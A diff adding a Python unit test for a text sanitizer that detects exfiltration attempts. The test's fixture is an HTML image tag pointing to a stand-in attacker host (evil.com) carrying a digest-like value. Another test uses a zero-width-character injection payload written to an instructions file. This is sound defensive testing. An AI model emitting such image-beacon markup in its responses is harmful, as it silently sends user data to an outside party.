@@ -282,6 +282,19 @@ def test_sanitize_text_html_layer() -> None:
     assert "leak" not in sanitize_text(HIDDEN_HTML, html=True).cleaned
 
 
+def test_sanitize_text_flag_digest_values() -> None:
+    """The keyword reaches Layer 3 across the bridge, and only when passed.
+
+    The wrapper builds the request dict by hand, so a keyword it accepts but
+    never serializes reads as working from the signature alone.
+    """
+    digest = f'<img src="https://evil.com/x?h={"a" * 40}">'
+    assert sanitize_text(digest, exfil_scan=True).warnings == []
+    widened = sanitize_text(digest, exfil_scan=True, flag_digest_values=True)
+    assert any("evil.com" in w for w in widened.warnings)
+    assert widened.modified is False  # Layer 3 reports, never rewrites
+
+
 def test_scan_and_clean_instruction_files(tmp_path: Path) -> None:
     payload = f"intro {ZERO_WIDTH_SPACE * 100} outro\n"
     (tmp_path / "NOTES.md").write_text(payload, encoding="utf-8")
